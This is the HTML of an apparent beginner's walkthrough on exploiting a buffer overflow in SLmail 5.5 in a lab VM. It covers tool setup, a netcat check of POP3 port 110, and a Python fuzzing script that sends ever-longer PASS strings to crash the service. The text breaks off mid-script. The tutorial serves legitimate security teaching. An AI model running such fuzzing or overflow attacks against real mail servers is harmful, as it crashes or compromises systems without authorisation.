data-key="14b4e4eda1c4451bb1e09ad6f2123cd5" class="reset-3c756112--listItemContent-756c9114"><p class="blockParagraph-544a408c--noMargin-acdf7afa" data-key="024ac913e4514a46ae12ff8b3e60cecb"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="f4a8d41df28d4fc8bfe446bef021b16b"><span data-offset-key="f4a8d41df28d4fc8bfe446bef021b16b:0">Download and install:</span></span></span></p><ul class="list-20526648--inList-acdf7afa" data-key="91d595f50db94837acbca742c1c9df64"><li class=""><div data-key="dab1864fe33c426bbbd6b56bf6cf69f4" class="reset-3c756112--listItemContent-756c9114"><p class="blockParagraph-544a408c--noMargin-acdf7afa" data-key="1fef59a763b04606951c16a92e406090"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="cd6cbfd6f1344b07ae47556a1792a2cb"><span data-offset-key="cd6cbfd6f1344b07ae47556a1792a2cb:0"><span data-slate-zero-width="z">​</span></span></span><a class="link-a079aa82--primary-53a25e66--link-faf6c434" style="color:#bf272e" href="https://www.google.com/chrome/" target="_blank" rel="noopener noreferrer" data-key="7758cc0f3952471cabd4a407508d8326"><span data-key="0e1ea6e79a594fa8aacab4525cc3f177"><span data-offset-key="0e1ea6e79a594fa8aacab4525cc3f177:0">Chrome</span></span></a><span data-key="7ef8b003c76140718cb2401e18255e95"><span data-offset-key="7ef8b003c76140718cb2401e18255e95:0"><span data-slate-zero-width="z">​</span></span></span></span></p></div></li><li class=""><div data-key="4adb2d8caae94eda8cef5e36d1e47325" class="reset-3c756112--listItemContent-756c9114"><p class="blockParagraph-544a408c--noMargin-acdf7afa" data-key="85e5eb8e0e9441f083d9a6292d1249dd"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="22e378becf294e15bbd37d389157fa8e"><span data-offset-key="22e378becf294e15bbd37d389157fa8e:0"><span data-slate-zero-width="z">​</span></span></span><a class="link-a079aa82--primary-53a25e66--link-faf6c434" style="color:#bf272e" href="https://eternallybored.org/misc/netcat/" target="_blank" rel="noopener noreferrer" data-key="b60ea595b0da4343a3a379b5a3a8d662"><span data-key="6c2224763f674c7dbd43417653814890"><span data-offset-key="6c2224763f674c7dbd43417653814890:0">Netcat</span></span></a><span data-key="8f29944bddfd40ddb89501aee7482bbc"><span data-offset-key="8f29944bddfd40ddb89501aee7482bbc:0"><span data-slate-zero-width="z">​</span></span></span></span></p></div></li><li class=""><div data-key="adc64726277444d1a1ec0a63c1686114" class="reset-3c756112--listItemContent-756c9114"><p class="blockParagraph-544a408c--noMargin-acdf7afa" data-key="57c102e12d3846f981b19a0f3f521664"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="8c1713df40614b3d94c9339deb32bbd5"><span data-offset-key="8c1713df40614b3d94c9339deb32bbd5:0"><span data-slate-zero-width="z">​</span></span></span><a class="link-a079aa82--primary-53a25e66--link-faf6c434" style="color:#bf272e" href="https://www.immunityinc.com/products/debugger/index.html" target="_blank" rel="noopener noreferrer" data-key="da9f6b574f7a467c9c4e1ef3c1e50ad4"><span data-key="73b533fc96144c1a8f6d7b86d4e73a88"><span data-offset-key="73b533fc96144c1a8f6d7b86d4e73a88:0">Immunity Debugger</span></span></a><span data-key="871d071304f948999c977db9ec51d1ac"><span data-offset-key="871d071304f948999c977db9ec51d1ac:0"><span data-slate-zero-width="z">​</span></span></span></span></p></div></li><li class=""><div data-key="a30190181e9b4773a84a69928fe02172" class="reset-3c756112--listItemContent-756c9114"><p class="blockParagraph-544a408c--noMargin-acdf7afa" data-key="bec317c8979c4113b870c723387f6469"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="1fe88e7d421c428cbb2c8c0d59446844"><span data-offset-key="1fe88e7d421c428cbb2c8c0d59446844:0"><span data-slate-zero-width="z">​</span></span></span><a class="link-a079aa82--primary-53a25e66--link-faf6c434" style="color:#bf272e" href="https://github.com/corelan/mona" target="_blank" rel="noopener noreferrer" data-key="b8b6c1affee44964a4a8a7317d65b87f"><span data-key="81c3c7da7e3740f9bb95bfd5ed8357fe"><span data-offset-key="81c3c7da7e3740f9bb95bfd5ed8357fe:0">Mona.py</span></span></a><span data-key="d4544a65e13b4c9f9c4b29a31ba5f9ed"><span data-offset-key="d4544a65e13b4c9f9c4b29a31ba5f9ed:0"><span data-slate-zero-width="z">​</span></span></span></span></p></div></li></ul></div></li></ol><p class="blockParagraph-544a408c" data-key="2565952b337a47e2ad909a14db7b93f8"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="1ca95fb8d52d4cebb422edd4d1dc0f44"><span data-offset-key="1ca95fb8d52d4cebb422edd4d1dc0f44:0">At this point, you&#x27;ll want to snapshot your VM so that you can revert back if your Windows trial expires or you blow up the whole operating system somehow.</span></span></span></p><h1 id="slmail-5-5" class="blockHeading-442b4f12--blockHeading1WithMargin-b69d755e" data-key="a80ac79892ca476da91af17fb09b62a7"><div class="blockHeadingContent-756c9114"><span class="text-4505230f--HeadingH700-04e1a2a3--textContentFamily-49a318e1"><span data-key="b38c57b108bb4158a2ee9bfae9892676"><span data-offset-key="b38c57b108bb4158a2ee9bfae9892676:0">SLmail 5.5</span></span></span><a href="#slmail-5-5" contenteditable="false" class="blockHeadingAnchor-34f75d78--blockHeadingAnchorHidden-d69b5eda"><span class="blockHeadingAnchorIcon-1c2bf3cb"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></g></svg></span></a></div><div role="button" tabindex="0" style="color:#bf272e" contenteditable="false" class="reset-3c756112--blockHeadingUp-c32402b2"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><line x1="12" y1="19" x2="12" y2="5"></line><polyline points="5 12 12 5 19 12"></polyline></g></svg></div></h1><p class="blockParagraph-544a408c" data-key="0dbcd9aed00a495e8252520d36840dd2"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="4409291052e647c8bd66ebbf4b9ada79"><span data-offset-key="4409291052e647c8bd66ebbf4b9ada79:0">SLmail is one of the classic examples for teaching buffer overflows. There are lots of walkthroughs online, but many concepts aren&#x27;t fully explained. This walkthrough is for all the ultranoobs like me who don&#x27;t know much about debuggers, hex, ASCII, python, etc.</span></span></span></p><h2 id="install-slmail" class="blockHeading-442b4f12--blockHeading2WithMargin-532d771d" data-key="03b62bc0d45646ee864c80e3bd3717b4"><div class="blockHeadingContent-756c9114"><span class="text-4505230f--HeadingH600-23f228db--textContentFamily-49a318e1"><span data-key="dd8ae27f5e7e4085b32f2640133e4eb8"><span data-offset-key="dd8ae27f5e7e4085b32f2640133e4eb8:0">Install SLmail</span></span></span><a href="#install-slmail" contenteditable="false" class="blockHeadingAnchor-34f75d78--blockHeadingAnchorHidden-d69b5eda"><span class="blockHeadingAnchorIcon-1c2bf3cb"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></g></svg></span></a></div></h2><p class="blockParagraph-544a408c" data-key="3bb3e4ced24a4ce3add94cf6c27bceaa"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="d4801e701c9649ea86be2943eaa0bc36"><span data-offset-key="d4801e701c9649ea86be2943eaa0bc36:0"><span data-slate-zero-width="z">​</span></span></span><a class="link-a079aa82--primary-53a25e66--link-faf6c434" style="color:#bf272e" href="https://www.exploit-db.com/apps/12f1ab027e5374587e7e998c00682c5d-SLMail55_4433.exe" target="_blank" rel="noopener noreferrer" data-key="1afc90b2607744dfa42cdca90bb01306"><span data-key="e0524e14320140e3929c42d799c5b6dc"><span data-offset-key="e0524e14320140e3929c42d799c5b6dc:0">Download it from Exploit-DB</span></span></a><span data-key="6b55647e893b472883d2ac8a9b84787f"><span data-offset-key="6b55647e893b472883d2ac8a9b84787f:0"> and install with defaults (just keep hitting Next). Since you&#x27;ll be attacking the POP server on port 110, you should check if it&#x27;s open and reachable. You can do this by connecting to it from your Windows netcat program:</span></span></span></p><p class="blockParagraph-544a408c" data-key="34541ce19e3f41928c6c9be0e28692de"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="347d4c37c4b24f8e9c5d4f960be6b9da"><span data-offset-key="347d4c37c4b24f8e9c5d4f960be6b9da:0"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true"> nc [Windows IP] 110</code></span></span></span></p><p class="blockParagraph-544a408c" data-key="cef7601c2f0d4771916321e9791e90f3"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="719119d7a9bb4f52ad45aa0ec35f7aa4"><span data-offset-key="719119d7a9bb4f52ad45aa0ec35f7aa4:0">You can also confirm the POP3 service is running with a quick nmap scan from your Kali machine. This becomes important when you run the debugger and crash the program - you can restart it if you have some kind of service manager (like XAMMP Control Panel), but if you just click on </span><span data-offset-key="719119d7a9bb4f52ad45aa0ec35f7aa4:1"><code spellcheck="false" class="code-81e98f88" data-slate-leaf="true">SLMail.exe</code></span><span data-offset-key="719119d7a9bb4f52ad45aa0ec35f7aa4:2"> the port may not show up unless you restart Windows. Checking that the POP3 service is up will save you a lot of headaches during exploitation.</span></span></span></p><h2 id="find-the-instruction-pointer" class="blockHeading-442b4f12--blockHeading2WithMargin-532d771d" data-key="925e00878a15490bad176184b3b10209"><div class="blockHeadingContent-756c9114"><span class="text-4505230f--HeadingH600-23f228db--textContentFamily-49a318e1"><span data-key="1662e452a97648f7a7f0594af9f8f16e"><span data-offset-key="1662e452a97648f7a7f0594af9f8f16e:0">Find the instruction pointer</span></span></span><a href="#find-the-instruction-pointer" contenteditable="false" class="blockHeadingAnchor-34f75d78--blockHeadingAnchorHidden-d69b5eda"><span class="blockHeadingAnchorIcon-1c2bf3cb"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"></path><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"></path></g></svg></span></a></div></h2><p class="blockParagraph-544a408c" data-key="c45972852722478682385dcbd689dfa7"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="a9253ccdaa8640f99145a22a546ebf7e"><span data-offset-key="a9253ccdaa8640f99145a22a546ebf7e:0">The first step is to crash the program by submitting an overly-long password during login, and watching what happens in Immunity Debugger.</span></span></span></p><p class="blockParagraph-544a408c" data-key="17b20cf4e88d407f8d8322a39ea0593a"><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1"><span data-key="f890236b59b646bf87d1783d3cba7f01"><span data-offset-key="f890236b59b646bf87d1783d3cba7f01:0">Create a small python script that will repeatedly log into the mail server and submit long strings of characters for the password:</span></span></span></p><div class="reset-3c756112--codeBlockWrapper-56f27afc"><div contenteditable="false" class="reset-3c756112--copyButtonWrapper-ca591f6e"><div aria-label="Copy" role="button" tabindex="0" class="reset-3c756112--touchableView-a079aa82--copyButton-4f9a9412--tooltipped-57ae51fe"><svg preserveAspectRatio="xMidYMid meet" height="1em" width="1em" fill="none" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" stroke="currentColor" class="icon-7f6730be--text-3f89f380"><g><rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"></path></g></svg></div></div><pre data-key="5c619379e7c8434fb36ee6799911306d" spellcheck="false" class="reset-3c756112--codeBlock-75b39b81"><div class="codeLine-a3169fbc" data-key="bd8c5f12d9e6423da3380cd340361cf3"><span data-key="6defeaa658014297815ecba944618297"><span data-offset-key="6defeaa658014297815ecba944618297:0"><span class="prism-token token  comment ">#!/usr/bin/python</span></span></span></div><div class="codeLine-a3169fbc" data-key="82698371f60f47a3a2eb88d6db1de3cb"><span data-key="b6020606740f4060996c9eb7d56ce8cf"><span data-offset-key="b6020606740f4060996c9eb7d56ce8cf:0"><span class="prism-token token 2 keyword ">import</span></span><span data-offset-key="b6020606740f4060996c9eb7d56ce8cf:1"><span class="prism-token token 3"> socket</span></span></span></div><div class="codeLine-a3169fbc" data-key="4656169b69204782acc0c4c950296102"><span data-key="6b1be55bf3d34a9fb89475c998749392"><span data-offset-key="6b1be55bf3d34a9fb89475c998749392:0"><span data-slate-zero-width="n">​</span></span></span></div><div class="codeLine-a3169fbc" data-key="55c09e792f27416080e63009b6197346"><span data-key="37d4acec2fee451dbc18ae186f251291"><span data-offset-key="37d4acec2fee451dbc18ae186f251291:0"><span class="prism-token token 4 comment "># Create an array where each item in the array will be a string of As</span></span></span></div><div class="codeLine-a3169fbc" data-key="f825fd436fb944588225db3bf8578f80"><span data-key="524db89f5b2c49bbb93c2d4e2ef0340b"><span data-offset-key="524db89f5b2c49bbb93c2d4e2ef0340b:0"><span class="prism-token token 6 builtin ">buffer</span></span><span data-offset-key="524db89f5b2c49bbb93c2d4e2ef0340b:1"><span class="prism-token token 7 operator ">=</span></span><span data-offset-key="524db89f5b2c49bbb93c2d4e2ef0340b:2"><span class="prism-token token 8 punctuation ">[</span></span><span data-offset-key="524db89f5b2c49bbb93c2d4e2ef0340b:3"><span class="prism-token token 9 string ">&quot;A&quot;</span></span><span data-offset-key="524db89f5b2c49bbb93c2d4e2ef0340b:4"><span class="prism-token token 10 punctuation ">]</span></span></span></div><div class="codeLine-a3169fbc" data-key="a5cb2d4920794cdaad46a90b4bfa56be"><span data-key="05e00877aa014d3bb4d928e099b2a90b"><span data-offset-key="05e00877aa014d3bb4d928e099b2a90b:0"><span class="prism-token token 11">counter</span></span><span data-offset-key="05e00877aa014d3bb4d928e099b2a90b:1"><span class="prism-token token 12 operator ">=</span></span><span data-offset-key="05e00877aa014d3bb4d928e099b2a90b:2"><span class="prism-token token 13 number ">100</span></span></span></div><div class="codeLine-a3169fbc" data-key="07332cecccd549059f360aa5f9e7b7f6"><span data-key="b6558d8086b845d9806a5003afe3e039"><span data-offset-key="b6558d8086b845d9806a5003afe3e039:0"><span data-slate-zero-width="n">​</span></span></span></div><div class="codeLine-a3169fbc" data-key="d48b74cc05a949e5b41b77577bf20b02"><span data-key="6c7026ad9e9a45a19ecb1089cb7757f2"><span data-offset-key="6c7026ad9e9a45a19ecb1089cb7757f2:0"><span class="prism-token token 15 comment "># Use a loop to build the array, first with 100 As, then 300, then 500, etc.</span></span></span></div><div class="codeLine-a3169fbc" data-key="b11b65160343498db0e76dc31d71ddcd"><span data-key="20a48acf401f416fa221fae5bd02cd87"><span data-offset-key="20a48acf401f416fa221fae5bd02cd87:0"><span class="prism-token token 17 keyword ">while</span></span><span data-offset-key="20a48acf401f416fa221fae5bd02cd87:1"><span class="prism-token token 18"> </span></span><span data-offset-key="20a48acf401f416fa221fae5bd02cd87:2"><span class="prism-token token 19 builtin ">len</span></span><span data-offset-key="20a48acf401f416fa221fae5bd02cd87:3"><span class="prism-token token 20 punctuation ">(</span></span><span data-offset-key="20a48acf401f416fa221fae5bd02cd87:4"><span class="prism-token token 21 builtin ">buffer</span></span><span data-offset-key="20a48acf401f416fa221fae5bd02cd87:5"><span class="prism-token token 22 punctuation ">)</span></span><span data-offset-key="20a48acf401f416fa221fae5bd02cd87:6"><span class="prism-token token 23"> </span></span><span data-offset-key="20a48acf401f416fa221fae5bd02cd87:7"><span class="prism-token token 24 operator ">&lt;=</span></span><span data-offset-key="20a48acf401f416fa221fae5bd02cd87:8"><span class="prism-token token 25"> </span></span><span data-offset-key="20a48acf401f416fa221fae5bd02cd87:9"><span class="prism-token token 26 number ">30</span></span><span data-offset-key="20a48acf401f416fa221fae5bd02cd87:10"><span class="prism-token token 27 punctuation ">:</span></span></span></div><div class="codeLine-a3169fbc" data-key="41091af448c14d32aa9b1f8e07f1da58"><span data-key="4b56956183dd4e6997baa72e7050c0fa"><span data-offset-key="4b56956183dd4e6997baa72e7050c0fa:0"><span class="prism-token token 28">    </span></span><span data-offset-key="4b56956183dd4e6997baa72e7050c0fa:1"><span class="prism-token token 29 builtin ">buffer</span></span><span data-offset-key="4b56956183dd4e6997baa72e7050c0fa:2"><span class="prism-token token 30 punctuation ">.</span></span><span data-offset-key="4b56956183dd4e6997baa72e7050c0fa:3"><span class="prism-token token 31">append</span></span><span data-offset-key="4b56956183dd4e6997baa72e7050c0fa:4"><span class="prism-token token 32 punctuation ">(</span></span><span data-offset-key="4b56956183dd4e6997baa72e7050c0fa:5"><span class="prism-token token 33 string ">&quot;A&quot;</span></span><span data-offset-key="4b56956183dd4e6997baa72e7050c0fa:6"><span class="prism-token token 34 operator ">*</span></span><span data-offset-key="4b56956183dd4e6997baa72e7050c0fa:7"><span class="prism-token token 35">counter</span></span><span data-offset-key="4b56956183dd4e6997baa72e7050c0fa:8"><span class="prism-token token 36 punctuation ">)</span></span></span></div><div class="codeLine-a3169fbc" data-key="df4bc55024a8404dbf94972e5f091338"><span data-key="fbcf1de14a8c4716844976b1bbd7f692"><span data-offset-key="fbcf1de14a8c4716844976b1bbd7f692:0"><span class="prism-token token 37">    counter</span></span><span data-offset-key="fbcf1de14a8c4716844976b1bbd7f692:1"><span class="prism-token token 38 operator ">=</span></span><span data-offset-key="fbcf1de14a8c4716844976b1bbd7f692:2"><span class="prism-token token 39">counter</span></span><span data-offset-key="fbcf1de14a8c4716844976b1bbd7f692:3"><span class="prism-token token 40 operator ">+</span></span><span data-offset-key="fbcf1de14a8c4716844976b1bbd7f692:4"><span class="prism-token token 41 number ">200</span></span></span></div><div class="codeLine-a3169fbc" data-key="395615e6fb044ec9ad527dda95b926a1"><span data-key="e0de591b65bc4f4c902d3a994b65cfe7"><span data-offset-key="e0de591b65bc4f4c902d3a994b65cfe7:0"><span data-slate-zero-width="n">​</span></span></span></div><div class="codeLine-a3169fbc" data-key="cb6ba5081c8b40b3b35bf23ab2237d12"><span data-key="ba35c1b85f394215b92104afb97f0981"><span data-offset-key="ba35c1b85f394215b92104afb97f0981:0"><span class="prism-token token 43 comment "># Try each string of As in the array as a password value</span></span></span></div><div class="codeLine-a3169fbc" data-key="c5d1a0825e134eb8a817945ee1b20add"><span data-key="eeca2c053b114ba999ce960a11995777"><span data-offset-key="eeca2c053b114ba999ce960a11995777:0"><span class="prism-token token 45 keyword ">for</span></span><span data-offset-key="eeca2c053b114ba999ce960a11995777:1"><span class="prism-token token 46"> string </span></span><span data-offset-key="eeca2c053b114ba999ce960a11995777:2"><span class="prism-token token 47 keyword ">in</span></span><span data-offset-key="eeca2c053b114ba999ce960a11995777:3"><span class="prism-token token 48"> </span></span><span data-offset-key="eeca2c053b114ba999ce960a11995777:4"><span class="prism-token token 49 builtin ">buffer</span></span><span data-offset-key="eeca2c053b114ba999ce960a11995777:5"><span class="prism-token token 50 punctuation ">:</span></span></span></div><div class="codeLine-a3169fbc" data-key="7e06dc35380b48f4840be772ab3e4e98"><span data-key="aab30b6af9ef44a1abfe7a2af47a3674"><span data-offset-key="aab30b6af9ef44a1abfe7a2af47a3674:0"><span class="prism-token token 51">    </span></span><span data-offset-key="aab30b6af9ef44a1abfe7a2af47a3674:1"><span class="prism-token token 52 keyword ">print</span></span><span data-offset-key="aab30b6af9ef44a1abfe7a2af47a3674:2"><span class="prism-token token 53"> </span></span><span data-offset-key="aab30b6af9ef44a1abfe7a2af47a3674:3"><span class="prism-token token 54 string ">&quot;Fuzzing PASS with %s bytes&quot;</span></span><span data-offset-key="aab30b6af9ef44a1abfe7a2af47a3674:4"><span class="prism-token token 55"> </span></span><span data-offset-key="aab30b6af9ef44a1abfe7a2af47a3674:5"><span class="prism-token token 56 operator ">%</span></span><span data-offset-key="aab30b6af9ef44a1abfe7a2af47a3674:6"><span class="prism-token token 57"> </span></span><span data-offset-key="aab30b6af9ef44a1abfe7a2af47a3674:7"><span class="prism-token token 58 builtin ">len</span></span><span data-offset-key="aab30b6af9ef44a1abfe7a2af47a3674:8"><span class="prism-token token 59 punctuation ">(</span></span><span data-offset-key="aab30b6af9ef44a1abfe7a2af47a3674:9"><span class="prism-token token 60">string</span></span><span data-offset-key="aab30b6af9ef44a1abfe7a2af47a3674:10"><span class="prism-token token 61 punctuation ">)</span></span></span></div><div class="codeLine-a3169fbc" data-key="5d43f1a2ef654b56a15eb22494f7ebe7"><span data-key="94e46954277c4580a0b2ee6ede8779e6"><span data-offset-key="94e46954277c4580a0b2ee6ede8779e6:0"><span class="prism-token token 62">    s</span></span><span data-offset-key="94e46954277c4580a0b2ee6ede8779e6:1"><span class="prism-token token 63 operator ">=</span></span><span data-offset-key="94e46954277c4580a0b2ee6ede8779e6:2"><span class="prism-token token 64">socket</span></span><span data-offset-key="94e46954277c4580a0b2ee6ede8779e6:3"><span class="prism-token token 65 punctuation ">.</span></span><span data-offset-key="94e46954277c4580a0b2ee6ede8779e6:4"><span class="prism-token token 66">socket</span></span><span data-offset-key="94e46954277c4580a0b2ee6ede8779e6:5"><span class="prism-token token 67 punctuation ">(</span></span><span data-offset-key="94e46954277c4580a0b2ee6ede8779e6:6"><span class="prism-token token 68">socket</span></span><span data-offset-key="94e46954277c4580a0b2ee6ede8779e6:7"><span class="prism-token token 69 punctuation ">.</span></span><span data-offset-key="94e46954277c4580a0b2ee6ede8779e6:8"><span class="prism-token token 70">AF_INET</span></span><span data-offset-key="94e46954277c4580a0b2ee6ede8779e6:9"><span class="prism-token token 71 punctuation ">,</span></span><span data-offset-key="94e46954277c4580a0b2ee6ede8779e6:10"><span class="prism-token token 72"> socket</span></span><span data-offset-key="94e46954277c4580a0b2ee6ede8779e6:11"><span class="prism-token token 73 punctuation ">.</span></span><span data-offset-key="94e46954277c4580a0b2ee6ede8779e6:12"><span class="prism-token token 74">SOCK_STREAM</span></span><span data-offset-key="94e46954277c4580a0b2ee6ede8779e6:13"><span class="prism-token token 75 punctuation ">)</span></span></span></div><div class="codeLine-a3169fbc" data-key="4e3002fb6ce847b2b0ffa15701940ae1"><span data-key="8f3e4a5d74c847aebef368269a89df00"><span data-offset-key="8f3e4a5d74c847aebef368269a89df00:0"><span class="prism-token token 77 comment "># Connect to Windows 7 machine IP, POP3 service</span></span></span></div><div class="codeLine-a3169fbc" data-key="7216c3c94ae540619d8e2ff1dd62b271"><span data-key="9cf159fb81544561b383276418420b43"><span data-offset-key="9cf159fb81544561b383276418420b43:0"><span class="prism-token token 78">    connect</span></span><span data-offset-key="9cf159fb81544561b383276418420b43:1"><span class="prism-token token 79 operator ">=</span></span><span data-offset-key="9cf159fb81544561b383276418420b43:2"><span class="prism-token token 80">s</span></span><span data-offset-key="9cf159fb81544561b383276418420b43:3"><span class="prism-token token 81 punctuation ">.</span></span><span data-offset-key="9cf159fb81544561b383276418420b43:4"><span class="prism-token token 82">connect</span></span><span data-offset-key="9cf159fb81544561b383276418420b43:5"><span class="prism-token token 83 punctuation ">(</span></span><span data-offset-key="9cf159fb81544561b383276418420b43:6"><span class="prism-token token 84 punctuation ">(</span></span><span data-offset-key="9cf159fb81544561b383276418420b43:7"><span class="prism-token token 85 string ">&#x27;10.0.0.1&#x27;</span></span><span data-offset-key="9cf159fb81544561b383276418420b43:8"><span class="prism-token token 86 punctuation ">,</span></span><span data-offset-key="9cf159fb81544561b383276418420b43:9"><span class="prism-token token 87 number ">110</span></span><span data-offset-key="9cf159fb81544561b383276418420b43:10"><span class="prism-token token 88 punctuation ">)</span></span><span data-offset-key="9cf159fb81544561b383276418420b43:11"><span class="prism-token token 89 punctuation ">)</span></span><span data-offset-key="9cf159fb81544561b383276418420b43:12"><span class="prism-token token 90"> </span></span></span></div><div class="codeLine-a3169fbc" data-key="1036a170850b47d3988b40716af2a38d"><span data-key="9549e5e07a2a4633acb71f0b21c5f700"><span data-offset-key="9549e5e07a2a4633acb71f0b21c5f700:0"><span class="prism-token token 90">    s</span></span><span data-offset-key="9549e5e07a2a4633acb71f0b21c5f700:1"><span class="prism-token token 91 punctuation ">.</span></span><span data-offset-key="9549e5e07a2a4633acb71f0b21c5f700:2"><span class="prism-token token 92">recv</span></span><span data-offset-key="9549e5e07a2a4633acb71f0b21c5f700:3"><span class="prism-token token 93 punctuation ">(</span></span><span data-offset-key="9549e5e07a2a4633acb71f0b21c5f700:4"><span class="prism-token token 94 number ">1024</span></span><span data-offset-key="9549e5e07a2a4633acb71f0b21c5f700:5"><span class="prism-token token 95 punctuation ">)</span></span></span></div><div class="codeLine-a3169fbc" data-key="b6478bbf17c346a18094a009d7d63ffc"><span data-key="ea8adb7ee44947269b8cb4ea56fa51e1"><span data-offset-key="ea8adb7ee44947269b8cb4ea56fa51e1:0"><span class="prism-token token 96">    s</span></span><span data-offset-key="ea8adb7ee44947269b8cb4ea56fa51e1:1"><span class="prism-token token 97 punctuation ">.</span></span><span data-offset-key="ea8adb7ee44947269b8cb4ea56fa51e1:2"><span class="prism-token token 98">send</span></span><span data-offset-key="ea8adb7ee44947269b8cb4ea56fa51e1:3"><span class="prism-token token 99 punctuation ">(</span></span><span data-offset-key="ea8adb7ee44947269b8cb4ea56fa51e1:4"><span class="prism-token token 100 string ">&#x27;USER username\r\n&#x27;</span></span><span data-offset-key="ea8adb7ee44947269b8cb4ea56fa51e1:5"><span class="prism-token token 101 punctuation ">)</span></span></span></div><div class="codeLine-a3169fbc" data-key="09fe6fdcb72642f58b97538dd6d6099a"><span data-key="4c7a091b45154ba19c3a56c132e83fb0"><span data-offset-key="4c7a091b45154ba19c3a56c132e83fb0:0"><span class="prism-token token 102">    s</span></span><span data-offset-key="4c7a091b45154ba19c3a56c132e83fb0:1"><span class="prism-token token 103 punctuation ">.</span></span><span data-offset-key="4c7a091b45154ba19c3a56c132e83fb0:2"><span class="prism-token token 104">recv</span></span><span data-offset-key="4c7a091b45154ba19c3a56c132e83fb0:3"><span class="prism-token token 105 punctuation ">(</span></span><span data-offset-key="4c7a091b45154ba19c3a56c132e83fb0:4"><span class="prism-token token 106 number ">1024</span></span><span data-offset-key="4c7a091b45154ba19c3a56c132e83fb0:5"><span class="prism-token token 107 punctuation ">)</span></span></span></div><div class="codeLine-a3169fbc" data-key="94b1f086027c477cac8c26f2ff40c721"><span data-key="20fe2ff8ec9f4ec5bd3f94b968af2801"><span data-offset-key="20fe2ff8ec9f4ec5bd3f94b968af2801:0"><span class="prism-token token 108">    s</span></span><span data-offset-key="20fe2ff8ec9f4ec5bd3f94b968af2801:1"><span class="prism-token token 109 punctuation ">.</span></span><span data-offset-key="20fe2ff8ec9f4ec5bd3f94b968af2801:2"><span class="prism-token token 110">send</span></span><span data-offset-key="20fe2ff8ec9f4ec5bd3f94b968af2801:3"><span class="prism-token token 111 punctuation ">(</span></span><span data-offset-key="20fe2ff8ec9f4ec5bd3f94b968af2801:4"><span class="prism-token token 112 string ">&#x27;PASS &#x27;</span></span><span data-offset-key="20fe2ff8ec9f4ec5bd3f94b968af2801:5"><span class="prism-token token 113"> </span></span><span data-offset-key="20fe2ff8ec9f4ec5bd3f94b968af2801:6"><span class="prism-token token 114 operator ">+</span></span><span data-offset-key="20fe2ff8ec9f4ec5bd3f94b968af2801:7"><span class="prism-token token 115"> string </span></span><span data-offset-key="20fe2ff8ec9f4ec5bd3f94b968af2801:8"><span class="prism-token token 116 operator ">+</span></span><span data-offset-key="20fe2ff8ec9f4ec5bd3f94b968af2801:9"><span class="prism-token token 117"> </span></span><span data-offset-key="20fe2ff8ec9f4ec5bd3f94b968af2801:10"><span class="prism-token token 118 string ">&#x27;\r\n&#x27;</span></span><span data-offset-key="20fe2ff8ec9f4ec5bd3f94b968af2801:11"><span class="prism-token token 119 punctuation ">)</span></span></span></div><div class="codeLine-a3169fbc" data-key="feae9bf9c89c43f0b48f197379e9b344"><span data-key="f8f60d5789d4470e93e662ca4856d49c"><span data-offset-key="f8f60d5789d4470e93e662ca4856d49c:0"><span class="prism-token token 120">    s</span></span><span data-offset-key="f8f60d5789d4470e93e662ca4856d49c:1"><span class="prism-token token 121 punctuation ">.</span></span><span data-offset-key="f8f60d5789d4470e93e662ca4856d49c:2"><span class="prism-token token 122">send</span></span><span data-offset-key="f8f60d5789d4470e93e662ca4856d49c:3"><span class="prism-token token 123 punctuation ">(</span></span><span data-offset-key="f8f60d5789d4470e93e662ca4856d49c:4"><span class="prism-token token 124 string ">&#x27;QUIT\r\n&#x27;</span></span><span data-offset-key="f8f60d5789d4470e93e662ca4856d49c:5"><span class="prism-token token 125 punctuation ">)</span></span></span></div><div class="codeLine-a3169fbc" data-key="8e5b8a8edf3a498e83f808171d4f96b4"><span 